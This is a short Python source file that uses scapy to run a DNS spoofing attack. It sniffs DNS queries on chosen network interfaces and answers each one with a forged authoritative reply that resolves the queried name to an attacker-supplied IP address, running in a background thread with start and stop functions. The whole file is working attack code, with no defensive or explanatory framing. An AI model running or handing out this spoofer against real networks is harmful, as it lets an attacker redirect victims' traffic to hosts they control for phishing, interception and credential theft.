from threading import Thread
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
from scapy.layers.inet import IP, UDP

STOP_SNIFFING = False


def stop_sniff(pkt):
    return STOP_SNIFFING


def sniffer(fakeip, interfaces):
    try:
        pkt = sniff(prn=lambda pkt: craft_false_response(pkt, fakeip, interfaces),
                    lfilter=lambda pkt: pkt.haslayer(DNSQR),
                    iface=interfaces,
                    stop_filter=stop_sniff)
    except IndexError as err:
        print(err)
        sniffer(fakeip, interfaces)


def craft_false_response(pkt, fakeip, interfaces):
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0,
              ar=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=600, rdata=fakeip))
    response = ip / udp / dns
    for interface in interfaces:
        send(response, verbose=False, iface=interface)
    # print(spoofed_response.summary())
    # print(spoofed_response.show())
    # print(f"Sending {pkt[IP].src} false DNS response: {domain} resolved to {fakeip}\n\n")


def start(fakeip, interfaces):
    dns_thread = Thread(target=sniffer, args=(fakeip, interfaces,))
    dns_thread.daemon = True
    dns_thread.start()


def stop():
    global STOP_SNIFFING
    STOP_SNIFFING = True
